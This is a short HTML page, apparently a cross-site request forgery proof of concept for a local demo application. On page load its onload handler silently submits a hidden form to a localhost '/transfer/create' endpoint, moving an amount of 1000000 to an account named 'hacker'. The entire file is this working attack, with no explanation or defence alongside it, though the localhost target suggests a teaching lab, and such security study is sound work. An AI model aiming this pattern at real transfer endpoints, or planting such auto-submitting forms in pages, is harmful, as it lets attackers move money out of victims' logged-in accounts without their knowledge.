<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body onload="document.transferForm.submit()">
    <!-- ngay khi mở lên sẽ thực hiện submit -->
    <form
      name="transferForm"
      method="POST"
      action="http://localhost:3000/transfer/create"
    >
      <input type="text" name="accountId" value="hacker" />
      <input type="number" name="amount" value="1000000" />
    </form>
  </body>
</html>
